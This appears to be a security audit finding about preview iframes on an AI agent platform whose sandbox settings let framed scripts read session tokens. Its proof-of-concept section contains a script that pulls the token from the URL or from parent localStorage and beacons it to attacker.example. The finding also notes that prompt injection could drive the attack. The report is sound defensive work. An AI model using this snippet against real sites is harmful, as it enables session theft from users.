# Preview iframes combine allow-scripts with allow-same-origin, nullifying sandbox isolation

**ID:** vuln-0003
**Severity:** MEDIUM
**Found:** 2026-11-21 10:02:13 UTC
**Target:** /workspace/agentcore-superagent-update/super-agent (frontend)
**CWE:** CWE-792
**CVSS:** 4.2
**Confidence:** Medium
**Fix Effort:** Low

## Description

Agent-output and published-app preview iframes use sandbox="allow-scripts allow-same-origin allow-forms allow-popups". For content served from the SPA/API origin this combination nullifies the sandbox: framed scripts run with full same-origin privileges and can read the parent's localStorage session tokens, which are also handed to the frame via ?token=.

## Evidence

Verified sandbox attributes at `frontend/src/pages/Chat.tsx:600` (dev-server preview), `frontend/src/pages/Chat.tsx:646` (PublishedAppPreviewTab), and `frontend/src/pages/AppRunner.tsx:160` (published app runner): all read `sandbox="allow-scripts allow-same-origin allow-forms allow-popups"`. Each frame's src is an API-origin URL that includes `?token=<session token>` (Chat.tsx:527, 617; AppRunner.tsx:140).

## Impact

A user-authored published app or agent-generated HTML/JS file previewed in one of these iframes executes script in the API/SPA origin (when co-hosted). It can read `localStorage.local_auth_token` / `cognito_id_token` of the victim — including via the token already present in its own URL — and exfiltrate the victim's session, or issue credentialed API requests. Any agent-authored content (which can incorporate untrusted instructions from knowledge-base files or prompt injection) becomes a same-origin script execution vector.

## Counterevidence

The sandbox attribute does omit `allow-top-navigation`, so framed content cannot navigate the top-level SPA away; the PDF iframe at Chat.tsx:125 uses sandbox="allow-scripts" without allow-same-origin, which is correctly hardened. If the SPA and API are on different origins in production, allow-same-origin grants no access to SPA storage and the practical impact reduces to the token-in-URL finding already reported separately. The framed content (published apps, agent-generated HTML/JS) is created by the platform itself, so an attacker must first get malicious content served from the API origin via an app/file they control.

## Confidence Rationale

Static trace confirms the sandbox attribute combination and that framed URLs carry the session token; the escalation to token theft additionally depends on the unconfirmed same-origin deployment topology, which is why this is not high confidence.

## What Would Change This Severity

Confirmation that the SPA and API are served same-origin in production (or that the token in the frame URL is the primary session token, which is already confirmed) raises this to high; a separate preview origin with no token in URLs would reduce it to low.

## Technical Analysis

Three preview iframes — the dev-server/file preview (`frontend/src/pages/Chat.tsx:596-600`), the PublishedAppPreviewTab (`frontend/src/pages/Chat.tsx:642-647`), and the published-app runner (`frontend/src/pages/AppRunner.tsx:160`) — set `sandbox="allow-scripts allow-same-origin allow-forms allow-popups"`. When sandboxed content is same-origin with its embedder, `allow-same-origin` plus `allow-scripts` lets the framed document remove its own sandbox attribute or simply script the parent (it is not cross-origin), accessing `parent.localStorage` where `local_auth_token`/`cognito_id_token` are stored. The frames load API-origin URLs that also carry the session token in the query string (Chat.tsx:527/617, AppRunner.tsx:140), so even without parent access the frame's own location exposes the token to its scripts. The framed content (user-published apps, agent-generated HTML workspace files) is attacker-controllable by a tenant author or via agent output influenced by knowledge-base/prompt content.

## Proof of Concept

1. Publish an app whose static content includes `fetch('/api/...', ...)` or `localStorage.getItem('local_auth_token')`, or place a workspace HTML file with such script and open its preview.
2. The preview loads in the iframe at Chat.tsx:600/646 or AppRunner.tsx:160 with `allow-scripts allow-same-origin`.
3. Because the frame content is same-origin with the token-carrying API (and the token is in the frame URL), the script reads the session token or performs authenticated API calls directly from within the frame.

```xml
<!-- content of a published app / workspace file rendered in one of the iframes -->
<script>
  // token is directly readable from this frame's own URL (AppRunner.tsx:140, Chat.tsx:617)
  const t = new URLSearchParams(location.search).get('token');
  // and, if SPA/API co-hosted, from parent storage:
  try { const lt = parent.localStorage.getItem('local_auth_token'); } catch (e) {}
  navigator.sendBeacon('https://attacker.example/', t || lt);
</script>
```

## Remediation

Serve previewed app/file content from a dedicated origin (separate subdomain) and drop `allow-same-origin` from the sandbox attribute, keeping `allow-scripts allow-forms`. Replace URL tokens with per-resource signed preview URLs or a scoped cookie, so the frame never receives or inherits the primary session token.

## Assumptions

Impact depends on deployment topology: the framed URLs target the API origin (VITE_API_BASE_URL) and the token URL param is only exposed to the frame if the SPA and API are same-origin or the token is otherwise in the frame's URL. Same-origin co-hosting of SPA and API is inferred (default localhost:3000) but unconfirmed for production; no live deployment was available for validation.
